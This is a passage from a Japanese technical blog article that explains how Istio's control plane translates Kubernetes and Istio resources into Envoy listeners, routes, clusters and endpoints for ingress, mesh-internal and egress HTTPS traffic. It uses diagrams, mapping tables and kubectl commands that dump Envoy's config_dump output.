Endpoints    Endpoints([☸️ Endpoints]) -.-> Gateway    Gateway([⛵️ Gateway]) -.-> VirtualServiceY    VirtualServiceY([⛵️ VirtualService Y]) -.-> DestinationRuleY    DestinationRuleY([⛵️ DestinationRule Y]) -.-> ServiceEntry    ServiceEntry([⛵️ ServiceEntry]) -.->|HTTPS| 宛先    classDef sly fill: #CCFFFF, stroke: black;    class 送信元 sly    classDef yellow fill: #FFFF88, stroke: black;    class 宛先 yellow    classDef blue fill: #326CE5, color: white, stroke: black;    class Gateway,VirtualServiceX,VirtualServiceY,DestinationRuleX,DestinationRuleY,Service,Endpoints,ServiceEntry blue各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。送信元Podは、HTTPSリクエストの宛先がServiceEntryでエントリ済みか否かの設定に応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、送信元PodはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、送信元PodはHTTPSリクエストの宛先に外のシステムを選択します。送信元Podは、Istio EgressGateway Podとの間で相互TLS認証を実施します。(1) で宛先がエントリ済であったとします。送信元Podは、HTTPSリクエストの向き先をIstio EgressGateway Podに変更します。送信元Podは、Kubernetesリソース (Service、Endpoints) やIstioカスタムリソース (VirtualService、DestinationRule) の設定に応じて、Istio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Podは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。Using Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio▶︎ Istio EgressGatewayの必要性についてistio-proxyコンテナを経由せずに外部システムに直接HTTPSリクエストを送信できるようになってしまい、システムの安全性が低くなります。他に、サービスメッシュ外への特定の通信を識別できるようになるメリットもあります。Istio / Accessing External ServicesIstio / Egress Gateway Performance Investigation03. istio-proxyコンテナによるHTTPS処理前章では、KubernetesリソースやIstioカスタムリソースによって抽象化されたEnvoyまで言及しませんでした。本章では、解説をもう少し具体化します。Istioは、Envoyプロセスを持つistio-proxyコンテナを作成します。このistio-proxyコンテナを使用してどのようにHTTPSリクエストを処理しているのかを、HTTPSリクエストの方向に分けて解説します。Envoyの設定については、次章以降で解説します。Istioコントロールプレーンの仕組みEnvoyの設定を抽象化する責務を担うのは、Istioコントロールプレーン (discoveryコンテナ) です。Istioコントロールプレーンは異なる責務を担う複数のレイヤーから構成されています。レイヤー名      責務    Config ingestionレイヤー            kube-apiserverからKubernetesリソースやIstioカスタムリソースの設定を取得します。Istioの初期から名前は変わっていません。          Config translationレイヤー                   リソースの設定をEnvoy設定に変換します。Istioの初期ではConfig Data Modelレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          Config servingレイヤー            Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。Istioの初期では、Proxy Servingレイヤーという名前で、執筆時点 (2024/01/16) で名前が変わっています。          図中の番号に沿って、Istioコントロールプレーンの仕組みを解説します。Config ingestionレイヤーにて、 Istioコントロールプレーンはkube-apiserverにHTTPSリクエストを送信します。ここで、KubernetesリソースやIstioカスタムリソースの設定を取得します。Config translationレイヤーにて、取得したリソースの設定をEnvoyの設定に変換します。Config servingレイヤーにて、Envoyの設定や証明書をPod内のistio-proxyコンテナに配布します。双方向ストリーミングRPCのため、istio-proxyコンテナがConfig servingレイヤーにリクエストを送信し、これらを取得することもあります。istio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHub一文带你彻底厘清 Isito 中的证书工作机制-赵化冰的博客 | Zhaohuabing Blog▶︎ Config servingレイヤーにあるXDS-APIについて▶︎ Istioカスタムリソースのコントローラーについてistio/architecture/networking/pilot.md at 1.20.2 \xb7 istio/istio \xb7 GitHubサービスメッシュ外からのHTTPSサービスメッシュ外から内にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。クライアントは、サービスメッシュ外からL7ロードバランサーにHTTPSリクエストを送信します。L7ロードバランサーは、Istio IngressGateway PodにHTTPSリクエストを送信します。もちろん、クラスター外からIstio IngressGateway PodにHTTPリクエストを送信するために、Service (例：NodePort Service) が必要です。Istio IngressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio IngressGateway Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。Istio IngressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ Pod内のiptablesについてistio-proxyコンテナを経由するように、istio-proxyコンテナにリクエストをリダイレクトします。iptablesのルールを書き換えるのはistio-initコンテナです。Istioは、istio-proxyコンテナと同じタイミングで、istio-initコンテナをPodにインジェクションします (Istio IngressGatewayとIstio EgressGatewayのPodは除きます)。画像引用元：SoByteistio-initコンテナは、istio-iptablesコマンドを実行し、iptablesのルールを書き換えます。また、istio-initコンテナはルールを書き換えた後に終了するため、Podの起動後にPod内に残りません\uD83D\uDC4D\uD83C\uDFFB$ pilot-agent istio-iptables \\\\    -p 15001 \\\\    -z 15006 \\\\    -u 1337 \\\\    -m REDIRECT \\\\    -i * \\\\    -x \\\\    -b * \\\\    -d 15090,15020Sidecar injection, transparent traffic hijacking, and routing process in Istio explained in detail | by Jimmy Song | MediumIstio / pilot-agent▶︎ Istio IngressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio IngressGateway Podにインジェクションしません。つまり、Istio IngressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBマイクロサービス間のHTTPSサービスメッシュ内のPodから別のPodにHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。宛先Pod内のistio-proxyコンテナは、HTTPSリクエストを宛先マイクロサービスに送信します。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSサービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) にHTTPSリクエストを送信する場合のistio-proxyコンテナです。各リソースは、以下の仕組みで、HTTPSリクエストを送信元から宛先まで届けます。図中の番号に沿って、通信の仕組みを解説します。Istioコントロールプレーンは、翻訳されたEnvoyの設定をPod内のistio-proxyコンテナに提供します。送信元Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナにリダイレクトします。送信元Pod内のistio-proxyコンテナは、宛先Podを決定し、またこのPodに対して相互TLS認証を実施します。この時、ServiceEntryで宛先がエントリ済みか否かに応じて、HTTPSリクエストの宛先を切り替えます。宛先がエントリ済みであれば、istio-proxyコンテナはHTTPSリクエストの宛先にIstio EgressGateway Podを選択します。宛先が未エントリであれば、istio-proxyコンテナはHTTPSリクエストの宛先に外のシステムを選択します。ここでは、宛先がエントリ済であったとします。送信元Pod内のistio-proxyコンテナは、HTTPSリクエストをIstio EgressGateway PodにL7ロードバランシングします。Istio EgressGateway Pod内のiptablesは、HTTPSリクエストをistio-proxyコンテナに送信します (リダイレクトは不要)。Istio EgressGateway Pod内のistio-proxyコンテナは、HTTPSリクエストをエントリ済システムにL7ロードバランシングします。▶︎ Istio EgressGateway Pod内のiptablesについてistio-proxyコンテナにリクエストをリダイレクトする必要がありません。そのため、Istioはiptablesのルールを書き換えるistio-initコンテナをIstio EgressGateway Podにインジェクションしません。つまり、Istio EgressGateway Pod内のiptablesのルールはデフォルトのままになっています\uD83D\uDC4D\uD83C\uDFFBUsing Istio to MITM our users’ traffic | Steven ReitsmaIngress, egress, ServiceEntry DATA Flow issues for ISTIO API Gateway? - Discuss Istio04. EnvoyによるHTTPS処理前章では、istio-proxyコンテナ内のEnvoyの設定まで、言及しませんでした。本章では、もっと具体化します。EnvoyがHTTPSリクエストを処理する仕組みを解説します。Envoyの設定の種類HTTPSリクエストを処理する場合、Envoyの設定が以下の順で紐付き、HTTPSリクエストを送信元から宛先まで届けます。flowchart TD    送信元 -.->|HTTPS| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター      ネットワークフィルター(ネットワークフィルター) -.-> HTTPフィルター    end    HTTPフィルター(HTTPフィルター) -.-> ルート    ルート(ルート) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|HTTPS| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,HTTPフィルター,ルート,クラスター,エンドポイント red各処理がどのような責務を担っているのかをもう少し詳しく見てみましょう。図中の番号に沿って、EnvoyがHTTPSリクエストを処理する仕組みを解説します。送信元からのHTTPSリクエストの宛先ポートで、リスナーを絞り込みます。通信の種類 (例：HTTP、HTTPS、TCP、UDP、Unixドメインソケットなど) に応じてフィルターを選び、各フィルターがパケットのヘッダーを処理します。もしHTTPSであれば、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。フィルターを使用して、HTTPSリクエストの宛先ポートで、ルートを絞り込みます。フィルターを使用して、HTTPSリクエストの宛先ホストやパスで、クラスターを絞り込みます。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、クラスター配下のエンドポイントを選びます。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、エンドポイントにL7ロードバランシングします。Life of a Request — envoy 1.37.0-dev-a59fb4 documentation▶ TCPリクエストを処理する場合についてflowchart TD    送信元 -.->|TCP| リスナー    リスナー(リスナー) -.-> リスナーフィルター    subgraph  \\"\\"      リスナーフィルター(リスナーフィルター) -.-> ネットワークフィルター    end    ネットワークフィルター(ネットワークフィルター) -.-> クラスター    クラスター(クラスター) -.-> エンドポイント    エンドポイント(エンドポイント) -.->|TCP| 宛先classDef sly fill: #CCFFFF, stroke: black;class 送信元 slyclassDef yellow fill: #FFFF88, stroke: black;class 宛先 yellowclassDef red fill: #EA6B66, font-weight :bold, stroke: black;class リスナー,リスナーフィルター,ネットワークフィルター,クラスター,エンドポイント redDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTXフィルターフィルターの一覧Envoyのフィルターは、Envoyの機能を拡張するための設定です。HTTPSリクエストを処理するためには、リスナーフィルター、ネットワークフィルター、HTTPフィルター、といったフィルターが必要になります。全ては解説しきれないため、HTTPSリクエストを処理するための代表的なフィルターをいくつか抜粋しました。ただ、 Istioはこれらのフィルターをデフォルトで有効にしてくれている ため、開発者がEnvoyのフィルターを設定する場面は少ないです。逆をいえば、Istioを介さずにEnvoyをそのまま使用する場合、開発者がEnvoyのフィルターを自前で設定する必要があります\uD83D\uDC4D\uD83C\uDFFBフィルターの種類      HTTPSリクエストの処理に必要なフィルター(一部抜粋)      説明    リスナーフィルター      Original Destination      istio-proxyコンテナへのリダイレクト前の宛先情報をEnvoyが取得できるようにします。Pod内のiptablesがHTTPSリクエストをistio-proxyコンテナにリダイレクトすると、HTTPSリクエストの宛先がistio-proxyコンテナに変わってしまいます。ただし、iptablesはリダイレクト前の宛先をカーネル上のSO_ORIGINAL_DSTという定数に格納してくれています。Envoyは、カーネル上のSO_ORIGINAL_DSTから本来の宛先を取得し、プロキシします。    HTTP Inspector      EnvoyがHTTPを検知できるようにします。    TLS Inspector      EnvoyがTLSを検知できるようにします。TLSを検知した場合、EnvoyはTLSに関する処理を実行します。例えば、DownstreamTlsContextは、リスナーフィルター直後に、送信元との間でTLS接続を確立し、パケットのL7のアプリケーションデータを復号化します。また、UpstreamTlsContextは、クラスターの処理時に、宛先との間でTLS接続を確立し、L7のアプリケーションデータを暗号化します。    ネットワークフィルター      HTTP connection manager      Envoyが、L7のアプリケーションデータを読み取り、また後続のHTTPフィルターを制御できるようにします。    HTTPフィルター      Router      Envoyがポート番号でルート、ホストやパスでクラスターを絞り込めるようにします。    gRPC-Web      EnvoyがHTTP/1.1で受信したHTTPSリクエストをHTTP/2に変換し、gRPCサーバーにプロキシできるようにします。    Filters — envoy 1.37.0-dev-a59fb4 documentation▶︎ Istioがデフォルトで有効にするEnvoyの設定についてistio-proxyコンテナは、イメージのビルド時に、あらかじめ用意しておいたEnvoyの設定ファイルを組み込みます。そのため、istio-proxyコンテナ内のEnvoyは、多くの設定をデフォルトで有効にできます。Istioを利用する開発者が、EnvoyがHTTPSリクエストを処理するために必要なフィルターを有効にしなくてよいのも、Istioのおかげです。Istioほんまにありがとな\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F  istio/pilot/docker/Dockerfile.proxyv2 at 1.20.2 \xb7 istio/istio \xb7 GitHubistio/tools/packaging/common/envoy_bootstrap.json at 1.20.2 \xb7 istio/istio \xb7 GitHubフィルターチェーンの仕組みEnvoyは、複数のフィルターからなるフィルターチェーンを実行し、HTTPSを処理します。図中の番号に沿って、Envoyのフィルターチェーンの仕組みを解説します。各フィルターの機能は、前述したフィルターの一覧を参考にしてください\uD83D\uDE47\uD83C\uDFFBリスナーフィルター (Original Destination、HTTP Inspector、TLS Inspectorなど) を実行します。(1) でTLS InspectorがTLSを検知した場合、DownstreamTlsContextで宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。ネットワークフィルター (HTTP connection managerなど) を実行します。HTTPフィルター (Router、gRPC-Webなど) を実行します。Life of a Request — envoy 1.37.0-dev-a59fb4 documentation▶ TCPリクエストを処理する場合についてTCP proxy — envoy 1.37.0-dev-a59fb4 documentation05. リソースの設定からEnvoy設定への翻訳いよいよです\uD83D\uDD25Istioが各リソースをいずれのEnvoyの設定に翻訳しているのかを解説します。表で対応関係の一覧を示した後、istio-proxyコンテナ内のEnvoyに当てはめました。各リソースとEnvoyの設定の関係一覧Istioコントロールプレーンは、KubernetesリソースやIstioカスタムリソースの設定をEnvoyの設定に翻訳し、処理の流れに当てはめます。以下の通り、各リソースがいずれのEnvoyの設定を抽象化するのかを整理しました。リソースによっては、Envoyの複数の設定を抽象化します。なお、Istioの用意したEnvoyのフィルターのデフォルト値を変更するユースケースが少ないため、これを抽象化するEnvoyFilterについては言及しません。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          Debugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPTX- YouTubeサービスメッシュ外からのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ外からのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio IngressGatewayの一部として使用します。ServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅            \xd7      ✅    ルート      ✅                  ✅            \xd7          クラスター      ✅                        ✅      \xd7      ✅    エンドポイント            ✅                  ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅      ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          宛先      リスナー      ✅                  ✅            ✅    ルート      ✅                  ✅                クラスター      ✅                        ✅      ✅    エンドポイント            ✅                  ✅          ▶︎ 送信元と宛先のNamespaceについてistio-ingress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio IngressGatewayを置くことで、Istio IngressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyでほとんど同じリソースが登場しますが、 Gatewayは送信元Envoyだけで登場します。リソースの種類だけに着目すると、以下になります。Gatewayが送信元Envoyだけで登場することがわかりやすくなりました。マイクロサービス間のHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから別のPodへのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。GatewayとServiceEntryは、使用しないリソースのため、\xd7としています。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            \xd7      ✅            \xd7      ✅    ルート      ✅            \xd7      ✅            \xd7          クラスター      ✅            \xd7            ✅      \xd7      ✅    エンドポイント            ✅      \xd7            ✅      \xd7          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、同じリソースが抽象化します。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      VirtualService      DestinationRule      PeerAuthentication    送信元      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          宛先      リスナー      ✅            ✅            ✅    ルート      ✅            ✅                クラスター      ✅                  ✅      ✅    エンドポイント            ✅            ✅          istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで、同じリソースが登場します。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場することがわかりやすくなりました。サービスメッシュ外へのHTTPSEnvoyの設定を抽象化するリソース一覧サービスメッシュ内のPodから外のシステム (例：データベース、ドメインレイヤー委譲先の外部API) へのHTTPSリクエストを処理する場合に関係するリソースを抜粋しました。Gatewayは、Istio EgressGatewayの一部として使用します。      Kubernetes ☸️リソース      Istio ⛵️カスタムリソース    Envoyの設定      Service      Endpoints      Gateway      VirtualService      DestinationRule      ServiceEntry      PeerAuthentication    リスナー      ✅            ✅      ✅                  ✅    ルート      ✅                  ✅                      クラスター      ✅                        ✅      ✅      ✅    エンドポイント            ✅                  ✅      ✅          リソースとEnvoyの設定の対応関係送信元または宛先Envoyに分けると、各リソースは以下のようにEnvoyの設定を抽象化します。話を簡単にするために、送信元と宛先は同じNamespaceにあると仮定します。他の場合とは異なり、送信元EnvoyでHTTPSリクエストの宛先を決める設定、または宛先EnvoyでHTTPSリクエストを受信する設定を、異なるリソースが抽象化します。PeerAuthenticationだけは、話を簡単にするために送信元と宛先が同じNamespaceであると仮定しているので、同じリソースが抽象化します。送信元Envoyの設定の抽象化で登場するリソースが宛先では登場せず、逆も然りです。      Kubernetes ☸️リソース       Istio ⛵️カスタムリソース     Envoyの設定      Service      Endpoints      Gateway      VirtualServiceX      〃Y      DestinationRuleX      〃Y      ServiceEntry      PeerAuthentication    送信元      リスナー      ✅                  ✅                              ✅    ルート      ✅                  ✅                                  クラスター      ✅                              ✅                  ✅    エンドポイント            ✅                        ✅                      宛先      リスナー                  ✅            ✅                        ✅    ルート                              ✅                            クラスター                                          ✅      ✅      ✅    エンドポイント                                          ✅      ✅          ▶︎ 送信元と宛先のNamespaceについてistio-egress) においた方が良いです。マイクロサービスとは異なるNamespaceにIstio EgressGatewayを置くことで、Istio EgressGatewayをアップグレードしやすくなったり、他から障害の影響を受けにくくなります\uD83D\uDE46\uD83C\uDFFB‍♂️istio-proxyコンテナ内のEnvoyに当てはめるこの表を、HTTPSリクエストの仕組みの中に当てはめると、以下になります。引用した前述の解説のイメージが掴めるかと思います。送信元または宛先Envoyで同じリソースが登場しません 。リソースの種類だけに着目すると、以下になります。送信元または宛先Envoyで同じリソースが登場しないことがわかりやすくなりました。06. 翻訳されたEnvoy設定値を見てみる前章では、Envoyの具体的な設定値まで、言及しませんでした。本章では、さらに具体化します。各リソースの設定の翻訳によって、Envoyの具体的にどのような設定値になっているのかを解説します。Envoyの現在の設定を出力するEnvoyは、現在の設定を確認するためのエンドポイント (/config_dump) を公開しています。これにHTTPSリクエストを送信し、具体的な設定値を出力してみましょう\uD83D\uDC4D\uD83C\uDFFBリスナーを出力する/config_dumpのクエリストリングにresource={dynamic_listeners}をつけると、Envoyのリスナーを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -PAdministration interface — envoy 1.37.0-dev-a59fb4 documentationConfigDump (proto) — envoy 1.37.0-dev-a59fb4 documentation▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dルートを出力する/config_dumpのクエリストリングにresource={dynamic_route_configs}をつけると、Envoyのルートを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -PAdministration interface — envoy 1.37.0-dev-a59fb4 documentationConfigDump (proto) — envoy 1.37.0-dev-a59fb4 documentationクラスターを出力する/config_dumpのクエリストリングにresource={dynamic_active_clusters}をつけると、Envoyのクラスターを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -PAdministration interface — envoy 1.37.0-dev-a59fb4 documentationConfigDump (proto) — envoy 1.37.0-dev-a59fb4 documentationエンドポイントを出力する/config_dumpのクエリストリングにinclude_edsをつけると、Envoyのエンドポイントを出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -PAdministration interface — envoy 1.37.0-dev-a59fb4 documentationConfigDump (proto) — envoy 1.37.0-dev-a59fb4 documentationSupported load balancers — envoy 1.37.0-dev-a59fb4 documentation証明書を出力する/config_dumpのクエリストリングにresource={dynamic_active_secrets}をつけると、証明書を出力できます。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_secrets}\\" | yq -PConfigDump (proto) — envoy 1.37.0-dev-a59fb4 documentationサービスメッシュ外からのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50000) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50000) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50000) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50000)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50000) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50000||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50000||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50000) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio Ingress vs. Kubernetes Ingress – Daniel Watrous on Software and Cloud Engineering▶︎ istio-proxyコンテナのプロキシ先のIPアドレスについてistio-proxyコンテナは、ローカルホストを127.0.0.6とし、HTTPSリクエストをマイクロサービスに送信します。これは、127.0.0.1を指定してしまうと、istio-proxyコンテナからマイクロサービスへの通信がiptables上でループしてしまうためです。istio-proxyコンテナからマイクロサービスへの通信では、正しくはiptables上でISTIO_OUTPUTからPOSTROUTINGに通信を渡します。一方で、もしローカルホストが127.0.0.1であると、ISTIO_OUTPUTからISTIO_IN_REDIRECTに通信を渡すことになり、istio-proxyコンテナに再びリダイレクトしてしまいます。hatappi1225さんの解説が鬼わかりやすかったです\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F画像引用元：mercari engineeringInbound Forwarding - Google ドキュメントiptables から理解する Istio 1.10 から変更された Inbound Forwarding | メルカリエンジニアリングマイクロサービス間のHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：50010) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：foo-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートやホストで管理しています (例：outbound|50010|foo-service.foo-namespace.svc.cluster.local) 。設定した負荷分散方式 (例：ラウンドロビンなど) に応じて、Service配下のPodを選びます。Envoyは、エンドポイントをPodのIPアドレスや宛先ポートで管理しています (例：<PodのIPアドレス>:50010) 。宛先との間でTLS接続を確立し、パケットのL7のアプリケーションデータを暗号化します。そして、HTTPSリクエストを宛先PodにL7ロードバランシングします。宛先Pod側のistio-proxyコンテナL7ロードバランシングされたHTTPSリクエストの宛先ポート (例：50010) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_50010)HTTPSリクエストを処理するための各種フィルターを選びます。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：50010) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：inbound|50010||) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：example.com) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターを宛先ポートで管理しています (例：inbound|50010||) エンドポイントを選びます。Envoyは、エンドポイントをローカルホストや宛先ポートで管理しています (例：127.0.0.6:50010) 。  ローカルホストにHTTPSリクエストを送信します。結果的に、宛先マイクロサービスにHTTPSリクエストが届きます。Istio流量管理实现机制深度解析-赵化冰的博客 | Zhaohuabing Blogサービスメッシュ外へのHTTPSここでは、istio-proxyコンテナはHTTPSリクエストを処理するとします。図中の番号に沿って、通信の仕組みを解説します。送信元Pod側のistio-proxyコンテナ送信元マイクロサービスからのHTTPSリクエストの宛先ポート (例：443) で、リスナーを絞り込みます。Envoyは、リスナーを宛先ポートで管理しています (例：0.0.0.0_443) 。HTTPSリクエストを処理するための各種フィルターを選びます。また、宛先とTLSハンドシェイクを実行し、パケットのL7のアプリケーションデータを復号化します。HTTPフィルターにより、HTTPSリクエストの宛先ポート (例：443) で、ルートを絞り込みます。Envoyは、ルートを宛先ポートで管理しています (例：443) 。HTTPフィルターにより、HTTPSリクエストの宛先ホスト (例：istio-egressgateway-service.foo-namespace.svc.cluster.local) やパス (例：/) で、クラスターを絞り込みます。Envoyは、クラスターをIstio EgressGateway 